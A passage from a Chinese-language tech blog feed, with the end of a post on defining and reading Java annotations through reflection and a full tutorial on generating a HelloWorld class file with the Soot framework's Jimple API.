class="params">()</span> <span class="keyword">default</span> ""</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本注解仅针对method，作用在runtime阶段。</p><p>使用该注解的方式应为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Report</span>(id=xxx,type=xxx,level=xxx,value=xxx)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testMethod</span><span class="params">(...)</span></span></span><br></pre></td></tr></table></figure><p>default的意义在于如果使用注解的时候未给参数赋值，可以采用default预先写好的值。</p><p>如果注解想在多个target使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="meta">@Target</span>(&#123;</span><br><span class="line">        ElementType.METHOD,</span><br><span class="line">        ElementType.TYPE</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Report &#123;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">id</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">false</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">type</span><span class="params">()</span> <span class="keyword">default</span> 0</span>;</span><br><span class="line">    <span class="function">String <span class="title">level</span><span class="params">()</span> <span class="keyword">default</span> "info"</span>;</span><br><span class="line">    <span class="function">String <span class="title">value</span><span class="params">()</span> <span class="keyword">default</span> ""</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="自定义注解"><a href="#自定义注解" class="headerlink" title="自定义注解"></a>自定义注解</h1><p>必须要写：</p><ul><li>@Target</li><li>@Retention</li></ul><p>可定义多个参数和默认值，核心参数使用value名称。</p><p>应当设置@Retention(RetentionPolicy.RUNTIME)便于运行期读取该Annotation。</p><p>Java提供的使用反射API读取<code>Annotation</code>的方法包括：</p><p>判断某个注解是否存在于<code>Class</code>、<code>Field</code>、<code>Method</code>或<code>Constructor</code>：</p><ul><li><code>Class.isAnnotationPresent(Class)</code></li><li><code>Field.isAnnotationPresent(Class)</code></li><li><code>Method.isAnnotationPresent(Class)</code></li><li><code>Constructor.isAnnotationPresent(Class)</code></li></ul><p>例如：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 判断@Report是否存在于Person类:</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">Person</span>.</span></span><span class="keyword">class</span>.is<span class="constructor">AnnotationPresent(Report.<span class="params">class</span>)</span>;</span><br></pre></td></tr></table></figure><p>使用反射API读取Annotation：</p><ul><li><code>Class.getAnnotation(Class)</code></li><li><code>Field.getAnnotation(Class)</code></li><li><code>Method.getAnnotation(Class)</code></li><li><code>Constructor.getAnnotation(Class)</code></li></ul><p>例如：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取Person定义的@Report注解:</span></span><br><span class="line"><span class="keyword">Report</span> <span class="keyword">report</span> = Person.<span class="keyword">class</span>.getAnnotation(<span class="keyword">Report</span>.<span class="keyword">class</span>);</span><br><span class="line">int <span class="keyword">type</span> = <span class="keyword">report</span>.<span class="keyword">type</span>();</span><br><span class="line">String level = <span class="keyword">report</span>.level();</span><br></pre></td></tr></table></figure><p>demo:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="meta">@Target</span>(ElementType.FIELD)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Range &#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">()</span> <span class="keyword">default</span> 0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">()</span> <span class="keyword">default</span> 255</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>某个JavaBean：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Range</span>(min=<span class="number">1</span>, max=<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Range</span>(max=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">public</span> String city;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写一个<code>Person</code>实例的检查方法，它可以检查<code>Person</code>实例的<code>String</code>字段长度是否满足<code>@Range</code>的定义：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check</span><span class="params">(Person person)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">  <span class="comment">// 遍历所有Field:</span></span><br><span class="line">    <span class="keyword">for</span> (Field field : person.getClass().getFields()) &#123;</span><br><span class="line">        <span class="comment">// 获取Field定义的@Range:</span></span><br><span class="line">        Range range = field.getAnnotation(Range<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="comment">// 如果@Range存在:</span></span><br><span class="line">        <span class="keyword">if</span> (range != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 获取Field的值:</span></span><br><span class="line">            Object value = field.get(person);</span><br><span class="line">            <span class="comment">// 如果值是String:</span></span><br><span class="line">            <span class="keyword">if</span> (value <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                String s = (String) value;</span><br><span class="line">                <span class="comment">// 判断值是否满足@Range的min/max:</span></span><br><span class="line">                <span class="keyword">if</span> (s.length() &lt; range.min() || s.length() &gt; range.max()) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Invalid field: "</span> + field.getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1265102803921888" target="_blank" rel="noopener">liaoxuefeng</a></p><p><a href="https://www.cnblogs.com/peida/archive/2013/04/24/3036689.html" target="_blank" rel="noopener">竹子</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;事不凝滞,理贵变通。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;写框架离不开Java注解，今天来总结。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://0range228.github.io/categories/Java/"/>
    
    
      <category term="Java基础" scheme="https://0range228.github.io/tags/Java%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>使用soot创建类文件</title>
    <link href="https://0range228.github.io/%E4%BD%BF%E7%94%A8soot%E5%88%9B%E5%BB%BA%E7%B1%BB%E6%96%87%E4%BB%B6/"/>
    <id>https://0range228.github.io/%E4%BD%BF%E7%94%A8soot%E5%88%9B%E5%BB%BA%E7%B1%BB%E6%96%87%E4%BB%B6/</id>
    <published>2021-03-25T02:19:08.000Z</published>
    <updated>2021-03-25T02:26:43.635Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>鱼沉雁杳天涯路，始信人间别离苦。</p></blockquote><p>老博客归档。</p><a id="more"></a><h1 id="如何创建一个类"><a href="#如何创建一个类" class="headerlink" title="如何创建一个类"></a>如何创建一个类</h1><p>之前看ASM创建一个类，很实费劲，需要直接写字节码口令，这次尝试用Soot API写一下最简单的Hello World。</p><h2 id="加载java-lang-Object和库类"><a href="#加载java-lang-Object和库类" class="headerlink" title="加载java.lang.Object和库类"></a>加载<code>java.lang.Object</code>和库类</h2><p>我们知道所有对象的父类都是Object类，那么上来第一步，先添加两个依赖类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建两个依赖类</span></span><br><span class="line">        Scene.v().loadClassAndSupport(<span class="string">"java.lang.Object"</span>);</span><br><span class="line">        Scene.v().loadClassAndSupport(<span class="string">"java.lang.System"</span>);</span><br></pre></td></tr></table></figure><p>这里，教程上说，当你loadClassAndSupport时候，相关类的所有内容都会被加载进来，一招拿下！</p><h2 id="创建一个新SootClass对象"><a href="#创建一个新SootClass对象" class="headerlink" title="创建一个新SootClass对象"></a>创建一个新<code>SootClass</code>对象</h2><p>接下来创建我们创建的这个类就叫做HelloWorld。在Soot里面需要用<code>SootClass</code>来封装，并将其父类设置为<code>java.lang.Object</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sClass = <span class="keyword">new</span> SootClass(<span class="string">"HelloWorld"</span>, Modifier.PUBLIC);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sClass.setSuperclass(Scene.v().getSootClass(<span class="string">"java.lang.Object"</span>));</span><br></pre></td></tr></table></figure><p>这会将新创建的类的父类设置为的<code>SootClass</code>对象<code>java.lang.Object</code>。注意使用工具的方法<code>getSootClass</code>上<code>Scene</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Scene.v().addClass(sClass);</span><br></pre></td></tr></table></figure><p>这会将新创建的<code>HelloWorld</code>类添加到中<code>Scene</code>。<code>Scene</code>一旦创建，所有类都应该属于它们。</p><h2 id="向SootClass添加方法"><a href="#向SootClass添加方法" class="headerlink" title="向SootClass添加方法"></a>向<code>SootClass</code>添加方法</h2><p>想向Soot类添加一个sout方法，打印helloworld，首先需要main方法。</p><p>目前Helloworld类的<code>main()</code>方法还是空的。</p><p>现在有了<code>SootClass</code>，我们需要向其中添加方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">method = <span class="keyword">new</span> SootMethod(<span class="string">"main"</span>,                 </span><br><span class="line">    Arrays.asList(<span class="keyword">new</span> Type[] &#123;ArrayType.v(RefType.v(<span class="string">"java.lang.String"</span>), <span class="number">1</span>)&#125;),</span><br><span class="line">    VoidType.v(), Modifier.PUBLIC | Modifier.STATIC);</span><br></pre></td></tr></table></figure><p>解读：</p><p>在这里需要首先写出一个main方法，他是public&amp;static的，并且main方法接受一个<code>java.lang.String</code>的参数数组，并且返回void。</p><p>SootClass：</p><p>每个SootClass代表一个Java对象，我们可以实例化该类，也可以为它指定类型。</p><p>如果想要获得<code>java.lang.String</code>的类型，我们可以用<code>RefType.v(&quot;java.lang.String&quot;)</code>。</p><p>如果现在已经有了一个SootClass对象sc，我们可以用<code>sc.getType()</code>获取对应的类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sClass.addMethod(method);</span><br></pre></td></tr></table></figure><p>此代码将main方法添加到其所属类，也就是sClass。</p><h2 id="向方法添加代码"><a href="#向方法添加代码" class="headerlink" title="向方法添加代码"></a>向方法添加代码</h2><p>如果方法不包含任何代码，则它是无用的。我们继续向该<code>main</code>方法添加一些代码。为此，我们必须为代码选择一个中间表示形式。</p><h3 id="创建JimpleBody"><a href="#创建JimpleBody" class="headerlink" title="创建JimpleBody"></a>创建<code>JimpleBody</code></h3><p>Jimple是soot四个中间表示形式之一，也是最受欢迎的。</p><p>在Soot中，通常这一步是将一个Body附加在SootMethod对象上，也就是附加到之前我们声明的method对象上。</p><p>每个Body知道自己属于哪个SootMethod，但是每个SootMethod每次只能有一个activeBody：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SootMethod.getActiveBody()</span><br></pre></td></tr></table></figure><p>更准确滴说，每个Body有三个特征组件：</p><ol><li><p>Local</p><p>Body体内的局部变量；</p></li><li><p>Trap</p><p>哪些代码用来捕获哪些异常；</p></li><li><p>Unit</p><p>Unit表示语句本身；</p></li></ol><p>所以接下来，我们需要给main方法添加一个Jimple主体，再像主体添加代码语句；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JimpleBody body = Jimple.v().newBody(method);</span><br><span class="line">method.setActiveBody(body);</span><br></pre></td></tr></table></figure><p>我们将Jimple单例对象称为<code>JimpleBody</code>与我们的方法相关联的新对象，并使它成为方法的活动主体。</p><p>这里先看一下Jimple中间代码：</p><p><img src="../images/%E4%BD%BF%E7%94%A8soot%E5%88%9B%E5%BB%BA%E7%B1%BB%E6%96%87%E4%BB%B6/image-20200718212825394.png" alt="image-20200718212825394"></p><p>接下来下面就需要按照目标Jimple一步步来做。</p><h3 id="添加本地变量"><a href="#添加本地变量" class="headerlink" title="添加本地变量"></a>添加本地变量</h3><p>添加本地变量需要用到arg，所以直接写；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arg = Jimple.v().newLocal(<span class="string">"l0"</span>, ArrayType.v(RefType.v(<span class="string">"java.lang.String"</span>), <span class="number">1</span>));</span><br><span class="line">body.getLocals().add(arg);</span><br></pre></td></tr></table></figure><p>这里是为啥呢，我的理解；</p><p>对于sout(“Helloworld!”)来说，我们需要有一个字符串变量，最后打印的也是他，不难理解；</p><p>这里局部变量还有一个就是打印对象，在Java里面，所有东西都是对象；</p><p>这里第二个就是java.io.PrintStream对象，打印流对象；</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//加入局部变量，java.io.PrintStream tmpRef</span></span><br><span class="line">tmpRef = <span class="module-access"><span class="module"><span class="identifier">Jimple</span>.</span></span>v<span class="literal">()</span>.<span class="keyword">new</span><span class="constructor">Local(<span class="string">"tmpRef"</span>, RefType.<span class="params">v</span>(<span class="string">"java.io.PrintStream"</span>)</span>);</span><br><span class="line">body.get<span class="constructor">Locals()</span>.add(tmpRef);</span><br></pre></td></tr></table></figure><h3 id="添加方法代码"><a href="#添加方法代码" class="headerlink" title="添加方法代码"></a>添加方法代码</h3><p>添加方法就需要unit了，直接写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//组成链，l0 = @parameter0</span></span><br><span class="line">            units.add(Jimple.v().newIdentityStmt(arg,</span><br><span class="line">                    Jimple.v().newParameterRef(ArrayType.v</span><br><span class="line">                            (RefType.v(<span class="string">"java.lang.String"</span>), <span class="number">1</span>), <span class="number">0</span>)));</span><br></pre></td></tr></table></figure><p>理解：</p><p>就在上面一步，arg是我们的字符串变量，交给JVM时候，他就是字符串变量l0。</p><p>继续写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//继续组成链，tmpRef = java.lang.System.out</span></span><br><span class="line">            units.add(Jimple.v().newAssignStmt(tmpRef, Jimple.v().newStaticFieldRef(</span><br><span class="line">                    Scene.v().getField(<span class="string">"&lt;java.lang.System: java.io.PrintStream out&gt;"</span>).makeRef())));</span><br></pre></td></tr></table></figure><p>理解：</p><p>这里其实就是把上面的tmpRef给到System.out对象，这里仍有存疑，之后会慢慢看。</p><p>最后一步，赋值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// insert "tmpRef.println("Hello world!")"</span></span><br><span class="line">            &#123;</span><br><span class="line">                SootMethod toCall = Scene.v().getMethod(<span class="string">"&lt;java.io.PrintStream: void println(java.lang.String)&gt;"</span>);</span><br><span class="line">                units.add(Jimple.v().newInvokeStmt(Jimple.v().newVirtualInvokeExpr(tmpRef, toCall.makeRef(), StringConstant.v(<span class="string">"Hello world!"</span>))));</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>我们获得带有签名的方法<code>&lt;java.io.PrintStream: void println(java.lang.String)&gt;</code>（该方法名为<code>println</code>，属于<code>PrintStream</code>，返回<code>void</code>并采用一个 <code>String</code>作为其参数-这足以唯一地标识该方法），并使用StringConstant“ Hello world！”调用它。</p><h2 id="写到类文件里面"><a href="#写到类文件里面" class="headerlink" title="写到类文件里面"></a>写到类文件里面</h2><p>将程序编写为<code>.class</code>文件的首选方法是使用ASM后端。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> java_version = Options.v().java_version();</span><br><span class="line">String fileName = SourceLocator.v().getFileNameFor(sClass, Options.output_format_class);</span><br><span class="line">OutputStream streamOut = <span class="keyword">new</span> FileOutputStream(fileName);</span><br><span class="line">BafASMBackend backend = <span class="keyword">new</span> BafASMBackend(sClass, java_version);</span><br><span class="line">backend.generateClassFile(streamOut);</span><br><span class="line">streamOut.close();</span><br></pre></td></tr></table></figure><p>也可以使用过时的Jasmin后端。我们首先构造输出流，该流将使用Jasmin源并输出<code>.class</code>文件。我们可以手动指定文件名，也可以让Soot确定正确的文件名。我们在这里做后者。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String fileName = SourceLocator.v().getFileNameFor(sClass, Options.output_format_class);</span><br><span class="line">OutputStream streamOut = <span class="keyword">new</span> JasminOutputStream(<span class="keyword">new</span> FileOutputStream(fileName));</span><br><span class="line">PrintWriter writerOut = <span class="keyword">new</span> PrintWriter(<span class="keyword">new</span> OutputStreamWriter(streamOut));</span><br><span class="line">JasminClass jasminClass = <span class="keyword">new</span> soot.jimple.JasminClass(sClass);</span><br><span class="line">jasminClass.print(writerOut);</span><br><span class="line">writerOut.flush();</span><br><span class="line">streamOut.close();</span><br></pre></td></tr></table></figure><p>如果我们希望输出简单的源代码而不是<code>.class</code>文件，则可以使用以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String fileName = SourceLocator.v().getFileNameFor(sClass, Options.output_format_jimple);</span><br><span class="line">OutputStream streamOut = <span class="keyword">new</span> FileOutputStream(fileName);</span><br><span class="line">PrintWriter writerOut = <span class="keyword">new</span> PrintWriter(<span class="keyword">new</span> OutputStreamWriter(streamOut));</span><br><span class="line">Printer.v().printTo(sClass, writerOut);</span><br><span class="line">writerOut.flush();</span><br><span class="line">streamOut.close();</span><br></pre></td></tr></table></figure><p>我们省略了<code>JasminOutputStream</code>，并在上调用<code>printTo</code>方法<code>Printer</code>。</p><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p><img src="../images/%E4%BD%BF%E7%94%A8soot%E5%88%9B%E5%BB%BA%E7%B1%BB%E6%96%87%E4%BB%B6/image-20200718202705757.png" alt="image-20200718202705757"></p><h1 id="源代码环节"><a href="#源代码环节" class="headerlink" title="源代码环节"></a>源代码环节</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//创建两个依赖类</span></span><br><span class="line">        Scene.v().loadClassAndSupport(<span class="string">"java.lang.Object"</span>);</span><br><span class="line">        Scene.v().loadClassAndSupport(<span class="string">"java.lang.System"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//声明目标类HelloWorld，他的父类当然是Object</span></span><br><span class="line">        SootClass sClass = <span class="keyword">new</span> SootClass(<span class="string">"HelloWorld"</span>, Modifier.PUBLIC);</span><br><span class="line">        sClass.setSuperclass(Scene.v().getSootClass(<span class="string">"java.lang.Object"</span>));</span><br><span class="line">        Scene.v().addClass(sClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建main方法，public static void main</span></span><br><span class="line">        SootMethod method = <span class="keyword">new</span> SootMethod(<span class="string">"main"</span>, Arrays.asList(<span class="keyword">new</span> Type[]&#123;ArrayType.v(RefType.v(<span class="string">"java.lang.String"</span>), <span class="number">1</span>)&#125;),</span><br><span class="line">                VoidType.v(), Modifier.PUBLIC | Modifier.STATIC);</span><br><span class="line">        sClass.addMethod(method);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建main方法内容，这里需要用到Jimple</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            JimpleBody body = Jimple.v().newBody(method);</span><br><span class="line">            method.setActiveBody(body);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//工具组件</span></span><br><span class="line">            Chain units = body.getUnits();</span><br><span class="line">            Local arg,tmpRef;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//加入局部变量，java.lang.String l0</span></span><br><span class="line">            arg = Jimple.v().newLocal(<span class="string">"l0"</span>, ArrayType.v(RefType.v(<span class="string">"java.lang.String"</span>), <span class="number">1</span>));</span><br><span class="line">            body.getLocals().add(arg);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//加入局部变量，java.io.PrintStream tmpRef</span></span><br><span class="line">            tmpRef = Jimple.v().newLocal(<span class="string">"tmpRef"</span>, RefType.v(<span class="string">"java.io.PrintStream"</span>));</span><br><span class="line">            body.getLocals().add(tmpRef);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//组成链，l0 = @parameter0</span></span><br><span class="line">            units.add(Jimple.v().newIdentityStmt(arg,</span><br><span class="line">                    Jimple.v().newParameterRef(ArrayType.v</span><br><span class="line">                            (RefType.v(<span class="string">"java.lang.String"</span>), <span class="number">1</span>), <span class="number">0</span>)));</span><br><span class="line"></span><br><span class="line">            <span class="comment">//继续组成链，tmpRef = java.lang.System.out</span></span><br><span class="line">            units.add(Jimple.v().newAssignStmt(tmpRef, Jimple.v().newStaticFieldRef(</span><br><span class="line">                    Scene.v().getField(<span class="string">"&lt;java.lang.System: java.io.PrintStream out&gt;"</span>).makeRef())));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// insert "tmpRef.println("Hello world!")"</span></span><br><span class="line">            &#123;</span><br><span class="line">                SootMethod toCall = Scene.v().getMethod(<span class="string">"&lt;java.io.PrintStream: void println(java.lang.String)&gt;"</span>);</span><br><span class="line">                units.add(Jimple.v().newInvokeStmt(Jimple.v().newVirtualInvokeExpr(tmpRef, toCall.makeRef(), StringConstant.v(<span class="string">"Hello world!"</span>))));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// insert "return"</span></span><br><span class="line">            units.add(Jimple.v().newReturnVoidStmt());</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        String fileName = SourceLocator.v().getFileNameFor(sClass, Options.output_format_class);</span><br><span class="line">        OutputStream streamOut = <span class="keyword">new</span> JasminOutputStream(<span class="keyword">new</span> FileOutputStream(fileName));</span><br><span class="line">        PrintWriter writerOut = <span class="keyword">new</span> PrintWriter(<span class="keyword">new</span> OutputStreamWriter(streamOut));</span><br><span class="line">        JasminClass jasminClass = <span class="keyword">new</span> soot.jimple.JasminClass(sClass);</span><br><span class="line">        jasminClass.print(writerOut);</span><br><span class="line">        writerOut.flush();</span><br><span class="line">        streamOut.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>#</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;鱼沉雁杳天涯路，始信人间别离苦。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;老博客归档。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://0range228.github.io/categories/Java/"/>
    
    
      <category term="Soot" scheme="https://0range228.github.io/tags/Soot/"/>
    
  </entry>
  
  <entry>
    <title>JVM操作数栈与局部变量表</title>
    <link href="https://0range228.github.io/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/"/>
    <id>https://0range228.github.io/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/</id>
    <published>2021-03-17T08:47:58.000Z</published>
    <updated>2021-05-18T03:52:51.918Z</updated>
    
